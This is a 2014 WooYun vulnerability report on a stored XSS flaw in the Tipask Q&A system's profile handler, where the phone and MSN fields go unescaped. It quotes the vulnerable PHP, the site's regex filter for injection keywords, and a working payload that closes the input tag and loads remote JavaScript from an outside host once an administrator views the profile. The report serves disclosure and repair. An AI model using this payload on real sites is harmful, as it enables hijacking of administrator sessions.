{"id": 54348, "wybug_id": "wooyun-2014-064740", "wybug_title": "tipask 盲打后台xss #2", "wybug_corp": "tipask问答系统", "wybug_author": "phith0n", "wybug_date": "2014-06-13 13:42", "wybug_open_date": "2014-09-11 13:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 盲打2，没啥限制。 详细说明：  修改个人资料处代码/control/user.php 397行：\nfunction onprofile() {    $navtitle = '个人资料';    if (isset($this->post['submit'])) {        $gender = $this->post['gender'];        $bday = $this->post['birthyear'] . '-' . $this->post['birthmonth'] . '-' . $this->post['birthday'];        $phone = $this->post['phone'];        $qq = $this->post['qq'];        $msn = $this->post['msn'];        $messagenotify = isset($this->post['messagenotify']) ? 1 : 0;        $mailnotify = isset($this->post['mailnotify']) ? 2 : 0;        $isnotify = $messagenotify + $mailnotify;        $introduction = htmlspecialchars($this->post['introduction']);        $signature = htmlspecialchars($this->post['signature']);        if (($this->post['email'] != $this->user['email']) && (!preg_match(\"/^[a-z'0-9]+([._-][a-z'0-9]+)*@([a-z0-9]+([._-][a-z0-9]+))+$/\", $this->post['email']) || $this->db->fetch_total('user', \" email='\" . $this->post['email'] . \"' \"))) {            $this->message(\"邮件格式不正确或已被占用!\", 'user/profile');        }        $_ENV['user']->update($this->user['uid'], $gender, $bday, $phone, $qq, $msn, $introduction, $signature, $isnotify);        isset($this->post['email']) && $_ENV['user']->update_email($this->post['email'], $this->user['uid']);        $this->message(\"个人资料更新成功\", 'user/profile');    }    include template('profile');}\n可见只对$this->post['introduction']、$this->post['signature']进行了htmlspecialchars过滤。phone、msn没有过滤，我们可以把xss代码放在电话号码或MSN处。tipask全局有个自称“xss检测”的函数，实际上是个注入检测，对我们的xss没有影响：\n/* XSS 检测 */function checkattack($reqarr, $reqtype = 'post') {    $filtertable = array(        'get' => '\\'|(and|or)\\\\b.+?(>|<|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)',        'post' => '\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)',        'cookie' => '\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)'    );    foreach ($reqarr as $reqkey => $reqvalue) {        if (preg_match(\"/\" . $filtertable[$reqtype] . \"/is\", $reqvalue) == 1 && !in_array($reqkey, array('content'))) {            print('Illegal operation!');            exit(-1);        }    }}\n   漏洞证明：  注册一个用户，打开资料编辑，将“手机”或“MSN”改成xss代码，注意要闭合前面的input框：\">\n\n保存以后就弹了：\n\n后台编辑该用户时触发：\n\n加载远程js(这个比较长，msn这个字段40个字符，差不多刚好够用，电话30个字符不够)：\n\"><svg onload=$.getScript('//xss.tw/01')\n   修复方案：  htmlspecialchars   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}